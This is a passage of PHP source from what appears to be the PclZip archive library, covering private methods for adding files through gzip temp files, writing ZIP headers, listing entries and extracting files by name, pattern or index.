  return $v_result;
}

function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=PCLZIP_ERR_NO_ERROR;
  
  $p_filename = $p_filedescr['filename'];


  if (($v_file = @fopen($p_filename, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
    return PclZip::errorCode();
  }

  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }

  $v_size = filesize($p_filename);
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file, $v_read_size);
    @gzputs($v_file_compressed, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file);
  @gzclose($v_file_compressed);

  if (filesize($v_gzip_temp_name) < 18) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
    return PclZip::errorCode();
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  $v_binary_data = @fread($v_file_compressed, 10);
  $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);

  $v_data_header['os'] = bin2hex($v_data_header['os']);

  @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
  $v_binary_data = @fread($v_file_compressed, 8);
  $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);

  $p_header['compression'] = ord($v_data_header['cm']);
  $p_header['crc'] = $v_data_footer['crc'];
  $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;

  @fclose($v_file_compressed);

  if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
    return $v_result;
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  fseek($v_file_compressed, 10);
  $v_size = $p_header['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file_compressed, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file_compressed);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privCalculateStoredFilename(&$p_filedescr, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];
  if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
    $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
  }
  else {
    $p_add_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
    $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
  }
  else {
    $p_remove_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
    $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
  }
  else {
    $p_remove_all_dir = 0;
  }


  if (isset($p_filedescr['new_full_name'])) {
    $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
  }
  
  else {

    if (isset($p_filedescr['new_short_name'])) {
      $v_path_info = pathinfo($p_filename);
      $v_dir = '';
      if ($v_path_info['dirname'] != '') {
        $v_dir = $v_path_info['dirname'].'/';
      }
      $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
    }
    else {
      $v_stored_filename = $p_filename;
    }

    if ($p_remove_all_dir) {
      $v_stored_filename = basename($p_filename);
    }
    else if ($p_remove_dir != "") {
      if (substr($p_remove_dir, -1) != '/')
        $p_remove_dir .= "/";

      if (   (substr($p_filename, 0, 2) == "./")
          || (substr($p_remove_dir, 0, 2) == "./")) {
          
        if (   (substr($p_filename, 0, 2) == "./")
            && (substr($p_remove_dir, 0, 2) != "./")) {
          $p_remove_dir = "./".$p_remove_dir;
        }
        if (   (substr($p_filename, 0, 2) != "./")
            && (substr($p_remove_dir, 0, 2) == "./")) {
          $p_remove_dir = substr($p_remove_dir, 2);
        }
      }

      $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                           $v_stored_filename);
      if ($v_compare > 0) {
        if ($v_compare == 2) {
          $v_stored_filename = "";
        }
        else {
          $v_stored_filename = substr($v_stored_filename,
                                      strlen($p_remove_dir));
        }
      }
    }
    
    $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
    
    if ($p_add_dir != "") {
      if (substr($p_add_dir, -1) == "/")
        $v_stored_filename = $p_add_dir.$v_stored_filename;
      else
        $v_stored_filename = $p_add_dir."/".$v_stored_filename;
    }
  }

  $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
  $p_filedescr['stored_filename'] = $v_stored_filename;
  
  return $v_result;
}

function privWriteFileHeader(&$p_header)
{
  $v_result=1;

  $p_header['offset'] = ftell($this->zip_fd);

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

  $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                      $p_header['version_extracted'], $p_header['flag'],
                        $p_header['compression'], $v_mtime, $v_mdate,
                        $p_header['crc'], $p_header['compressed_size'],
					  $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len']);

  fputs($this->zip_fd, $v_binary_data, 30);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }

  return $v_result;
}

function privWriteCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];


  $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                      $p_header['version'], $p_header['version_extracted'],
                        $p_header['flag'], $p_header['compression'],
					  $v_mtime, $v_mdate, $p_header['crc'],
                        $p_header['compressed_size'], $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len'], $p_header['comment_len'],
                        $p_header['disk'], $p_header['internal'],
					  $p_header['external'], $p_header['offset']);

  fputs($this->zip_fd, $v_binary_data, 46);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }
  if ($p_header['comment_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
  }

  return $v_result;
}

function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
{
  $v_result=1;

  $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                      $p_nb_entries, $p_size,
					  $p_offset, strlen($p_comment));

  fputs($this->zip_fd, $v_binary_data, 22);

  if (strlen($p_comment) != 0)
  {
    fputs($this->zip_fd, $p_comment, strlen($p_comment));
  }

  return $v_result;
}

function privList(&$p_list)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
  {
    $this->privSwapBackMagicQuotes();
    
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

    return PclZip::errorCode();
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_central_dir['offset']))
  {
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  for ($i=0; $i<$v_central_dir['entries']; $i++)
  {
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_header['index'] = $i;

    $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
    unset($v_header);
  }

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privConvertHeader2FileInfo($p_header, &$p_info)
{
  $v_result=1;

  $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
  $p_info['filename'] = $v_temp_path;
  $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
  $p_info['stored_filename'] = $v_temp_path;
  $p_info['size'] = $p_header['size'];
  $p_info['compressed_size'] = $p_header['compressed_size'];
  $p_info['mtime'] = $p_header['mtime'];
  $p_info['comment'] = $p_header['comment'];
  $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
  $p_info['index'] = $p_header['index'];
  $p_info['status'] = $p_header['status'];
  $p_info['crc'] = $p_header['crc'];

  return $v_result;
}

function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (   ($p_path == "")
    || (   (substr($p_path, 0, 1) != "/")
	    && (substr($p_path, 0, 3) != "../")
		&& (substr($p_path,1,2)!=":/")))
    $p_path = "./".$p_path;

  if (($p_path != "./") && ($p_path != "/"))
  {
    while (substr($p_path, -1) == "/")
    {
      $p_path = substr($p_path, 0, strlen($p_path)-1);
    }
  }

  if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
  {
    $p_remove_path .= '/';
  }
  $p_remove_path_size = strlen($p_remove_path);

  if (($v_result = $this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_pos_entry = $v_central_dir['offset'];

  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      return PclZip::errorCode();
    }

    $v_header = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      return $v_result;
    }

    $v_header['index'] = $i;

    $v_pos_entry = ftell($this->zip_fd);

    $v_extract = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_extract = true;
                }
            }
            elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_extract = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
            $v_extract = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
        
        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_extract = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }

    else {
        $v_extract = true;
    }

  if (   ($v_extract)
      && (   ($v_header['compression'] != 8)
	      && ($v_header['compression'] != 0))) {
        $v_header['status'] = 'unsupported_compression';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();
            
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
		                       "Filename '".$v_header['stored_filename']."' is "
			  	    	  	   ."compressed by an unsupported compression "
			  	    	  	   ."method (".$v_header['compression'].") ");

            return PclZip::errorCode();
	  }
  }
  
  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
        $v_header['status'] = 'unsupported_encryption';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();

            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
		                       "Unsupported encryption for "
			  	    	  	   ." filename '".$v_header['stored_filename']
							   ."'");

            return PclZip::errorCode();
	  }
  }

    if (($v_extract) && ($v_header['status'] != 'ok')) {
        $v_result = $this->privConvertHeader2FileInfo($v_header,
	                                        $p_file_list[$v_nb_extracted++]);
        if ($v_result != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
        }

        $v_extract = false;
    }
    
    if ($v_extract)
    {

      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_header['offset']))
      {
        $this->privCloseFd();

        $this->privSwapBackMagicQuotes();

        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        return PclZip::errorCode();
      }

      if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

        $v_string = '';

        $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        $p_file_list[$v_nb_extracted]['content'] = $v_string;

        $v_nb_extracted++;
        
        if ($v_result1 == 2) {
        	break;
        }
      }
      elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
	        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
        $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
      else {
        $v_result1 = $this->privExtractFile($v_header,
	                                      $p_path, $p_remove_path,
										  $p_remove_all_path,
										  $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
    }
  }

  $this->privCloseFd();
  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if ($p_remove_all_path == true) {
      if (($p_entry['external']&0x00000010)==0x00000010) {

          $p_entry['status'] = "filtered";

          return $v_result;
      }

      $p_entry['filename'] = basename($p_entry['filename']);
  }

  else if ($p_remove_path != "")
  {
    if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
    {

      $p_entry['status'] = "filtered";

      return $v_result;
    }

    $p_remove_path_size = strlen($p_remove_path);
    if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
    {

      $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

    }
  }

  if ($p_path != '') {
    $p_entry['filename'] = $p_path."/".$p_entry['filename'];
  }
  
  if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
    $v_inclusion
    = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                              $p_entry['filename']); 
    if ($v_inclusion == 0) {

      PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
		                     "Filename '".$p_entry['filename']."' is "
							 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

      return PclZip::errorCode();
    }
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

  if (file_exists($p_entry['filename']))
  {

    if (is_dir($p_entry['filename']))
    {

      $p_entry['status'] = "already_a_directory";
      
      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
		                     "Filename '".$p_entry['filename']."' is "
							 ."already used by an existing directory");

          return PclZip::errorCode();
	    }
    }
    else if (!is_writeable($p_entry['filename']))
    {

      $p_entry['status'] = "write_protected";

      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		                     "Filename '".$p_entry['filename']."' exists "
							 ."and is write protected");

          return PclZip::errorCode();
	    }
    }

    else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
    {
      if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
	    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
  	  }
	    else {
          $p_entry['status'] = "newer_exist";

          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

              PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		             "Newer version of '".$p_entry['filename']."' exists "
				    ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

              return PclZip::errorCode();
	      }
	    }
    }
    else {
    }
  }

  else {
    if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
      $v_dir_to_check = $p_entry['filename'];
    else if (!strstr($p_entry['filename'], "/"))
      $v_dir_to_check = "";
    else
      $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {

        $p_entry['status'] = "path_creation_fail";

        $v_result = 1;
      }
    }
  }

  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      if ($p_entry['compression'] == 0) {

        if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
        {

          $p_entry['status'] = "write_error";

          return $v_result;
        }


        $v_size = $p_entry['compressed_size'];
        while ($v_size != 0)
        {
          $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
          $v_buffer = @fread($this->zip_fd, $v_read_size);
          @fwrite($v_dest_file, $v_buffer, $v_read_size);            
          $v_size -= $v_read_size;
        }

        fclose($v_dest_file);

        touch($p_entry['filename'], $p_entry['mtime']);
        

      }
      else {
        if (($p_entry['flag'] & 1) == 1) {
          PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
          return PclZip::errorCode();
        }


        if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
            && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
                || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                    && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
          $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) {
            return $v_result;
          }
        }
        
        else {

        
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {

            $p_entry['status'] = "error";
            
            return $v_result;
          }
          
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {

            $p_entry['status'] = "write_error";

            return $v_result;
          }

          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          @fclose($v_dest_file);
          
        }

        @touch($p_entry['filename'], $p_entry['mtime']);
      }

      if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {

        @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
      }

    }
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileUsingTempFile(&$p_entry, &$p_options)
{
  $v_result=1;
      
  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }


  $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
  @fwrite($v_dest_file, $v_binary_data, 10);

  $v_size = $p_entry['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
  @fwrite($v_dest_file, $v_binary_data, 8);

  @fclose($v_dest_file);

  if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
    $p_entry['status'] = "write_error";
    return $v_result;
  }

  if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
    @fclose($v_dest_file);
    $p_entry['status'] = "read_error";
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }


  $v_size = $p_entry['size'];
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @gzread($v_src_file, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }
  @fclose($v_dest_file);
  @gzclose($v_src_file);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privExtractFileInOutput(&$p_entry, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }

    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compressed_size'] == $p_entry['size']) {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

        echo $v_buffer;
        unset($v_buffer);
      }
      else {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        $v_file_content = gzinflate($v_buffer);
        unset($v_buffer);

        echo $v_file_content;
        unset($v_file_content);
      }
    }
  }

if ($p_entry['status'] == "aborted") {
    $p_entry['status'] = "skipped";
}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)
{
  $v_result=1;

  $v_header = array();
  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compression'] == 0) {

        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {

        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        if (($p_string = @gzinflate($v_data)) === FALSE) {
        }
      }

    }
    else {
    }
    
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
    
    $v_local_header['content'] = $p_string;
    $p_string = '';

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    $p_string = $v_local_header['content'];
    unset($v_local_header['content']);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privReadFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x04034b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 26);

  if (strlen($v_binary_data) != 26)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

  $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);
